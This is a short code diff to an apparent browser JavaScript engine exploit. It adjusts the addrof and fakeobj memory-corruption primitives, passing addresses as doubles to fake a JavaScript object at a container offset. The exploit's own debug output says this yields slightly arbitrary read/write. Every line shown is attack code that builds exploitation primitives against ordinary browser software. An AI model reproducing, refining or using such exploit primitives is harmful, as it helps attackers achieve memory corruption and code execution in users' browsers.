@@ -412,7 +412,7 @@ function iv(x){
               return new Int64.fromDouble(a1[offset]);
             }
             fakeobj = (addr) => {
-              a1[offset] = addr;
+              a1[offset] = new Int64(addr).asDouble();
               return b1[0];
             }
             port.postMessage("addrof and fakeobj done");
@@ -455,7 +455,7 @@ var print = (msg) => {
     var containerAddr = addrof(container);
     print("[+] container @"+containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(Add(containerAddr,0x10).asDouble());
+    var hax = fakeobj(Add(containerAddr,0x10));
     print("got hax obj we now have slighty arb r/w")
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
